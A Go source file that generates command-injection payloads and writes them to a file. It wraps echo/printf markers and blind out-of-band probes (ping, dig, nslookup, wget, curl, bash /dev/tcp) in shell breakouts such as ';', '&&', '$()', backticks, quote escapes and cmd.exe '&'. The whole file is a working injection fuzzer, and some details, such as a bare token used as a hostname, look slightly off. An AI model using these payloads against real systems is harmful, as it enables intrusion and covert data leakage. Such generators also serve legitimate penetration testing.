package main

import (
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"
	"flag"
)

type transformer struct {
	function func(string) string
	rarity   int
}

// create a new transformer
func makeTransformer(function func(string) string, rarity int) transformer {
	return transformer{
		function: function,
		rarity:   rarity,
	}
}

// filter transformers by rarity
func filterTransformers(unfiltered []transformer, rarity int) []func(string) string {
	filtered := []func(string) string{}
	for _, i := range unfiltered {
		if i.rarity <= rarity {
			filtered = append(filtered, i.function)
		}
	}
	return filtered
}

// structure to hold different types of payloads for an operating system
type osPayloads struct {
	payloads        []transformer
	blindPayloads   []transformer
	embeddings      []transformer
	blindEmbeddings []transformer
}

// escape string with backslashes for dash
func backslashEscapeForDash(s string) string {
	builder := strings.Builder{}
	for _, c := range s {
		builder.WriteString(fmt.Sprintf("\\%c", c))
	}
	return builder.String()
}

// double escape for bash
func doubleEscapeForBash(s string) string {
	builder := strings.Builder{}
	builder.WriteString(`"`)

	b := []byte(s)
	for _, code := range b {
		builder.WriteString(fmt.Sprintf("\\\\x%02x", code))
	}

	builder.WriteString(`"`)
	return builder.String()
}

// create a sprintf function with backslash escape
func sprintfWithBackslashEscape(s string) func(string) string {
	return func(t string) string {
		return fmt.Sprintf(s, backslashEscapeForDash(t))
	}
}

// create a sprintf function with double escape
func sprintfWithDoubleEscape(s string) func(string) string {
	return func(t string) string {
		return fmt.Sprintf(s, doubleEscapeForBash(t))
	}
}

// create a sprintf function with dot escape
func sprintfWithDotEscape(s string) func(string) string {
	return func(t string) string {
		return fmt.Sprintf(s, strings.ReplaceAll(t, ".", "\\.")) // escape dots
	}
}

// Unix/Linux payloads
var unixPayloads osPayloads = osPayloads{
	payloads: []transformer{
		makeTransformer(sprintfWithDoubleEscape("echo -e %s"), 2),
		makeTransformer(sprintfWithDoubleEscape("printf %s"), 2),
		makeTransformer(sprintfWithBackslashEscape("printf %s"), 1),
	},
	blindPayloads: []transformer{
		makeTransformer(sprintfWithDotEscape("ping -c 1 %s"), 1),
		makeTransformer(sprintfWithDotEscape("dig %s"), 2),
		makeTransformer(sprintfWithDotEscape("nslookup %s"), 2),
		makeTransformer(sprintfWithDotEscape("wget http://%s/ -O /dev/null"), 1),
		makeTransformer(sprintfWithDotEscape("curl http://%s/"), 2),
		makeTransformer(sprintfWithDotEscape("curl %s"), 1),
		makeTransformer(sprintfWithDotEscape("true < /dev/tcp/%s/80"), 1),
		makeTransformer(sprintfWithDotEscape(`true < "$(printf \\x2fdev\\x2ftcp\\x2f%s\\x2f80)"`), 1),
	},
	embeddings: []transformer{
		makeTransformer(func(arg string) string {
			return "; " + arg + "; "
		}, 1),
		makeTransformer(func(arg string) string {
			return "; " + arg + " 2>&1; "
		}, 2),
		makeTransformer(func(arg string) string {
			return " && false || " + arg + " && "
		}, 2),
		makeTransformer(func(arg string) string {
			return " && false || " + arg + " 2>&1 && "
		}, 2),
		makeTransformer(func(arg string) string {
			return "\"; " + arg + "; \""
		}, 1),
		makeTransformer(func(arg string) string {
			return "'; " + arg + "; '"
		}, 1),
		makeTransformer(func(arg string) string {
			return "\"; " + arg + " 2>&1; \""
		}, 2),
		makeTransformer(func(arg string) string {
			return "'; " + arg + " 2>&1; '"
		}, 2),
		makeTransformer(func(arg string) string {
			return arg
		}, 1),
		makeTransformer(func(arg string) string {
			return `bash -c "$@" x eval ` + arg + `;`
		}, 1),
	},
	blindEmbeddings: []transformer{
		makeTransformer(func(arg string) string {
			return "$(" + arg + ")"
		}, 1),
		makeTransformer(func(arg string) string {
			return "`" + arg + "`"
		}, 1),
	},
}

// escape string for Windows cmd.exe
func escapeStringForCmdExe(s string) string {
	builder := strings.Builder{}
	for _, c := range s {
		builder.WriteString(fmt.Sprintf("^%c", c))
	}
	return builder.String()
}

// create a sprintf function for cmd.exe
func sprintfForCmdExe(s string) func(string) string {
	return func(t string) string {
		return fmt.Sprintf(s, escapeStringForCmdExe(t))
	}
}

// create a sprintf function with dot escape for cmd.exe
func sprintfWithDotEscapeForCmdExe(s string) func(string) string {
	return func(t string) string {
		return fmt.Sprintf(s, strings.ReplaceAll(t, ".", "^.")) // escape dots
	}
}

// Windows payloads
var windowsPayloads osPayloads = osPayloads{
	payloads: []transformer{
		makeTransformer(sprintfForCmdExe("echo %s"), 1),
	},
	blindPayloads: []transformer{
		makeTransformer(sprintfWithDotEscapeForCmdExe("ping -n 1 %s"), 2),
		makeTransformer(sprintfWithDotEscapeForCmdExe("nslookup %s"), 1),
	},
	embeddings: []transformer{
		makeTransformer(func(arg string) string {
			return " & " + arg + " & "
		}, 1),
	},
}

// list of operating systems
var operatingSystems []osPayloads = []osPayloads{unixPayloads, windowsPayloads}

// list of escapers
var escapers = []transformer{
	makeTransformer(func(arg string) string {
		return arg
	}, 1),
	makeTransformer(func(arg string) string {
		return strings.ReplaceAll(arg, "%", "%%")
	}, 1),
}

// generate a random token
func randomToken() string {
	var token [32]byte
	rand.Seed(time.Now().UnixNano())
	rand.Read(token[:])
	return hex.EncodeToString(token[:])
}

// generate normal payloads
func GenerateNormalPayloads(rarity int) []func(string) string {
	payloads := []func(string) string{}
	for _, os := range operatingSystems {
		for _, payload := range filterTransformers(os.payloads, rarity) {
			for _, embedding := range filterTransformers(os.embeddings, rarity) {
				for _, escaper := range filterTransformers(escapers, rarity) {
					payloads = append(payloads, func(token string) string {
						return escaper(embedding(payload(token)))
					})
				}
			}
		}
	}
	return payloads
}

// generate blind payloads
func GenerateBlindPayloads(rarity int) []func(string) string {
	payloads := []func(string) string{}
	for _, os := range operatingSystems {
		for _, payload := range filterTransformers(os.blindPayloads, rarity) {
			for _, embedding := range filterTransformers(os.embeddings, rarity) {
				for _, escaper := range filterTransformers(escapers, rarity) {
					payloads = append(payloads, func(token string) string {
						return escaper(embedding(payload(token)))
					})
				}
			}
			for _, embedding := range filterTransformers(os.blindEmbeddings, rarity) {
				for _, escaper := range filterTransformers(escapers, rarity) {
					payloads = append(payloads, func(token string) string {
						return escaper(embedding(payload(token)))
					})
				}
			}
		}
	}
	return payloads
}

func main() {
	// command-line arguments
	outputFile := flag.String("output", "payloads.txt", "output file name")
	rarity := flag.Int("rarity", 1, "rarity level for payloads (1 to 2)")
	flag.Parse()

	// generate normal and blind payloads
	normalPayloads := GenerateNormalPayloads(*rarity)
	blindPayloads := GenerateBlindPayloads(*rarity)

	// write payloads to file
	file, err := os.Create(*outputFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: failed to create file: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()

	// generate random token
	token := randomToken()

	// write normal payloads
	for _, payloadFunc := range normalPayloads {
		payload := payloadFunc(token)
		fmt.Fprintln(file, payload)
	}

	// write blind payloads
	for _, payloadFunc := range blindPayloads {
		payload := payloadFunc(token)
		fmt.Fprintln(file, payload)
	}

	fmt.Printf("Generated %d normal payloads and %d blind payloads to %s\n", len(normalPayloads), len(blindPayloads), *outputFile)
}
